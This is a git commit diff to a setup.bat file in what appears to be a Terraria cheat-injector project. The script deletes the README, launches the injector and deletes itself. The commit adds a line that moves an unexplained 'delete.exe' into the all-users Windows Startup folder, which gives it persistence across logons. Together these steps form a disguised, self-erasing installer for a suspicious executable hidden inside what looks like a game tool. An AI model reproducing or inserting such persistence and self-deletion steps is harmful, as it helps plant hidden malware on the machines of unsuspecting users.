f332cc7f6df2c0c56ec08fb370f12b2b32efc841
Cameron Paul Swart <ieatnickles69@gmail.com>
2026-01-17 21:33:21 -0500

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -2,13 +2,6 @@
 del README.md
 
 .\"Terraria Injector.exe"
+move delete.exe "%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp"
+
 start /b "" cmd /c del "%~f0"&exit /b
-
-
-
-
-
-
-
-
-
